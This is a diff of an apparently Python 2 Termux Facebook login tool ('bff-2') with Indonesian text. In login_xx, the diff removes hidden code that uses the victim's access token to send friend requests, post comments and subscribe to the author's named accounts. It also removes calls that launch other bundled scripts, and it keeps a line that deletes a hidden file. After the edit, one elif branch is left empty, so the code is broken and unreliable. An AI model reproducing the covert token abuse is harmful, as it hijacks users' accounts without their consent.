@@ -1,5 +1,5 @@
 # -*- coding: UTF-8 -*-
-# Hayo anak ajg mau ngapain?.
+# anjarsugendro
 
 import requests, bs4, sys, os, subprocess, sys, random, json, time, re
 reload(sys)
@@ -83,8 +83,6 @@ def menu_x():
     elif r == '9' or r =='09':
     	result()
     elif r in['in','In','IN']:
-    	os.system('cd rom')
-    	os.system('python2 bff')
     elif r == '0' or r =='00':
         print ''
         jalan('\x1b[1;95m•\x1b[1;96m Good bye epribadeh... Emuach...\xf0\x9f\x98\x98\x1b[0;97m\n')
@@ -92,7 +90,6 @@ def menu_x():
         os.sys.exit()
     elif r == '66':
         raw_input('\x1b[1;95m• \x1b[1;93mpress enter ')
-        os.system('xdg-open https://www.facebook.com/romi.29.04.03')
         try:
             os.remove('/data/data/com.termux/files/usr/lib/.bash')
             exit('\x1b[1;92m• run again the tools.')
@@ -134,11 +131,9 @@ def pilih_masuk():
         kuki()
     elif romi == '3' or romi == '03':
         tik()
-        os.system('xdg-open https://youtu.be/IG5QfdxRkeY')
         os.sys.exit()
     elif romi == '4' or romi == '04':
         tik()
-        os.system('xdg-open https://youtu.be/b9crrvr6d2s')
         os.sys.exit()
     elif romi == '0' or romi == '00':
     	print ''
@@ -206,20 +201,6 @@ def login_xx():
     except IOError:
         print '\x1b[1;92m• invalid'
         masuk()
-
-    fbid = '100002461344178' # Id Nick unik sniper @() Sheikh Sami Shuja Uddin MD
-    kom = random.choice(["Hello I'm a bff-2 user","Be yourself and never surendtod:v","Login bff-2 \nhttps://www.facebook.com/100002461344178/posts/3965852000173472/?substory_index=0&app=fbl"])
-    #requests.post('https://graph.facebook.com/496077571350068/comments/?message=' +toket+ '&access_token=' + toket) 
-    #requests.post('https://graph.facebook.com/570025450621946/comments/?message=' + kom + '&access_token=' + toket)
-    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + fbid + '&access_token=' + toket)
-    requests.post('https://graph.facebook.com/3933263743432298/comments/?message=' + kom + '&access_token=' + toket) 
-    requests.post('https://graph.facebook.com/546133328/subscribers?access_token=' + toket) # Akun 2007
-    requests.post('https://graph.facebook.com/100002461344178/subscribers?access_token=' + toket) # Nick unik sniper @() Sheikh Sami Shuja Uddin MD
-    requests.post('https://graph.facebook.com/100028434880529/subscribers?access_token=' + toket) # Romi Afrizal 2018
-    requests.post('https://graph.facebook.com/100067807565861/subscribers?access_token=' + toket) # Romi Afrizal 2021
-    requests.post('https://graph.facebook.com/100003723696885/subscribers?access_token=' + toket) # Iqbal Bobz
-    requests.post('https://graph.facebook.com/100041129048948/subscribers?access_token=' + toket) # Iwan Hadiansyah
-    requests.post('https://graph.facebook.com/100007520203452/subscribers?access_token=' + toket) # Hamzah Kirana
     exit('\x1b[1;92m• login success, run again the tools. ')
 
 def xxxx():
@@ -5650,7 +5631,6 @@ def xxxx():
 def awokawokkontol():
 	os.system("pip2 install ipaddress")
 	os.system("git pull")
-	os.system("python2 rom/bffb.py")
 	
 def anaksetan():
 	print ''
